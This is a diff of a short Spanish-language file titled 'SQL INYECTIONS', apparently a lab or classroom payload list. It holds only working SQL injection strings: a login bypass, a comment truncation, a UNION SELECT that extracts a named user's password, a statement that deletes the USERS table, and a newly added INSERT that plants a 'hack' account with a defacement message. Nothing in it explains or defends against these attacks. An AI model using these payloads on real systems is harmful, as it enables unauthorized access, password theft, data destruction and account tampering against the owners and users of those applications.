@@ -1,5 +1,6 @@
 SQL INYECTIONS
 
+
 ' OR 1=1 --
 
 rosa' --
@@ -7,3 +8,5 @@ rosa' --
 --' UNION SELECT userpass AS username, '123' userpass, 'Lo que esta despues de Bienvenid@ es la password de juan' sensitive_information FROM USERS WHERE username = 'juan' ORDER BY username DESC; --
 
 '; DELETE FROM USERS; --
+
+'; INSERT INTO USERS (USERNAME, USERPASS, SECRET) VALUES ('hack', 'hack', 'Su App fue vulnerada.'); --
